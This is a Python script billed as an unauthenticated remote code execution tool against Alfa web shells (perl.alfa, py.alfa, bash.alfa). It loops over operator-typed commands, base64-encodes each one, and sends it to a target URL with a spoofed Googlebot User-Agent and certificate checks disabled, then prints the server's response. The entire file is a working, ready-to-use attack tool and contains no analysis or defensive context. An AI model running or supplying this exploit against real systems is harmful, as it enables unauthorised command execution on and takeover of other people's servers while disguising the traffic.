import requests
import base64
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init

init(autoreset=True)

RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
WHITE = Fore.WHITE

warnings.simplefilter('ignore', InsecureRequestWarning)

def execute_command(url, command):
    try:
        encoded_command = base64.b64encode(command.encode()).decode()
        encoded_check = base64.b64encode(b"").decode()

        data = {
            "cmd": encoded_command,
            "check": encoded_check
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        }

        print(f"{WHITE}[*] Sending command: {GREEN}{command}{WHITE}")
        response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)

        if response.status_code == 200:
            print(f"{GREEN}[*] Command executed successfully.{WHITE}")
            print(response.text)
        else:
            print(f"{RED}[*] HTTP Status Code: {response.status_code}{WHITE}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[*] Request failed: {e}{WHITE}")
    except Exception as e:
        print(f"{RED}[*] {e}{WHITE}")

def main():
    print(f"{YELLOW}Alfa Shell Unauthenticated Remote Code Execution (perl.alfa, py.alfa, bash.alfa){WHITE}")
    
    try:
        target_url = input(f"{GREEN}Enter the target URL: {WHITE}")
        if not target_url.startswith("http"):
            print(f"{RED}[*] Invalid URL. Please include 'http://' or 'https://'.{WHITE}")
            return

        print(f"{GREEN}Target URL set to: {GREEN}{target_url}{WHITE}")

        while True:
            command = input(f"{YELLOW}Enter command to execute (or 'exit' to quit): {WHITE}")
            if command.lower() == "exit":
                print(f"{YELLOW}[*] Exiting...{WHITE}")
                break
            execute_command(target_url, command)

    except ValueError:
        print(f"{RED}[*] Invalid input. Please enter a valid URL.{WHITE}")

if __name__ == "__main__":
    main()
